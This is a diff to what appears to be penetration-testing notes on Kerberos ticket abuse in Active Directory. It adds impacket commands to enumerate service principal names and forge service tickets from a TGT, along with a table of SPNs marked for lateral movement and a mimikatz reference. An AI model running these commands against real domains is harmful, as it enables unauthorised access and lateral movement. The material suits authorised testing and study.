@@ -147,14 +147,21 @@ klist
 
 When we generate a ticket, we'll have a TGT (Ticket Granting Ticket). To use this ticket for a specific service, we have to craft an ST (Service Ticket) for the specific service we want.
 
-This is all the services available for crafting a ST
+To find the services available to use inside the domain, we can use this command:
+
+```bash
+impacket-GetUserSPNs DOMAIN/USER:'PASS' -dc-ip <DC_IP>
+```
+
+This is all the possible services:
 
 <details>
 
 <summary>SPNs list</summary>
 
-| `CIFS/hostname`            | SMB / File shares / Smbclient                 | Often used for lateral movement or dumping files |
+| SPN                        | Use Case / Maps to                            | Description                                      |
 | -------------------------- | --------------------------------------------- | ------------------------------------------------ |
+| `CIFS/hostname`            | SMB / File shares / Smbclient                 | Often used for lateral movement or dumping files |
 | `HOST/hostname`            | RDP, WMI, PsExec, WinRM                       | Generic system access — many tools use this      |
 | `LDAP/hostname`            | LDAP directory queries                        | Used to query AD objects                         |
 | `HTTP/hostname`            | WinRM, web services, Outlook Web Access (OWA) | Required for PowerShell Remoting                 |
@@ -171,6 +178,10 @@ This is all the services available for crafting a ST
 | `SVC/hostname` (custom)    | Custom apps registered with SPNs              | Use `setspn -Q */hostname` to enumerate          |
 
 </details>
+
+```bash
+impacket-getST -spn 'SERVICE/FQDN' -k -no-pass DOMAIN/USER_OF_THE_TGT -debug
+```
 
 
 
@@ -189,7 +200,7 @@ mimikatz > misc::cmd # this open cmd promt with current privileges
 export KRB5CCNAME=$(pwd)/NAME.ccache
 
 # create a ST for CIFS service 
-impacket-getST -spn 'CIFS/TARGET_DOMAIN' -k -no-pass DOMAIN/USER_OF_THE_TGT -debug
+impacket-getST -spn 'CIFS/FQDN_DOMAIN' -k -no-pass DOMAIN/USER_OF_THE_TGT -debug
 
 # set the new ST
 export KRB5CCNAME=$(pwd)/NAME.ccache
